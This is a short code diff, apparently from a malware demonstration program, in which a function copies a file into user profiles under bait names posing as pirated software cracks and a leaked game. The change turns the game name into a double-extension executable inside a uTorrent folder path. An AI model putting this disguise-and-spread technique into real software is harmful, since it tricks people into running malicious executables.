@@ -127,9 +127,9 @@ static void Cracklol01()
     CopyToProfiles(
         L"Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE.7z.rar09.exe",
         L"uTorrent\\Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE\\Setup+Crack",
-        L"Grand Theft Auto VI CYBERLEEK-buildv.1.0.245.iso" // todo: would be cool if this were the
-                                                            // default filename if the demo if being
-                                                            // executed AFTER 01/01/2027
+        L"Grand Theft Auto VI CYBERLEEK-buildv.1.0.245\\Grand Theft Auto VI CYBERLEEK-buildv.1.0.245.iso.exe" // todo: would be cool if this were the
+                                                                                                              // default filename if the demo if being
+                                                                                                              // executed AFTER 01/01/2027
     );
 }
 
